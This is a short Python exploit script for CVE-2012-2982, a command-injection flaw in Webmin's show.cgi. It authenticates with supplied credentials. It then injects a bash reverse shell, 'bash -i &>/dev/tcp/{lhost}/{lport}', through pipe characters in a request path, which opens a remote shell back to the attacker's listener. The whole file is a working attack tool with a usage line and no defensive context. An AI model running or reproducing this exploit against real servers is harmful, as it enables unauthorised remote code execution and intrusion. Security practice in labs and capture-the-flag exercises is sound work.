#!/usr/bin/env python

# A Python Exploit against CVE-2012-2982
# Author: Anurag Mondal (7Ragnarok7)

import string
import requests
import random
from sys import argv

try: lhost, lport, target, user, passw = argv[1:]
except: exit('Usage: python webmin-2012-2982.py lhost lport rhost user pass')

payload = f'bash -c "bash -i &>/dev/tcp/{lhost}/{lport}<&1"'
url = f'http://{target}/session_login.cgi'
data = {'page': '/', 'user': user, 'pass': passw}
resp = requests.post(url, data=data, cookies={'testing': '1'}, verify=False, allow_redirects=False)

try: sid = resp.cookies["sid"]
except: sid = None
if resp.status_code == 302 and sid: print('\nAuthentication successful!!!')
else: exit('\nAuthentication Failed!!!')

alphanums = ''.join([random.choice(string.ascii_letters + string.digits) for i in range(5)])
url = f'http://{target}/file/show.cgi/bin/{alphanums}|{payload}|'
print('Executing the payload...')
resp = requests.get(url, cookies={'sid': sid},verify=False, allow_redirects=False)

print(resp.text)

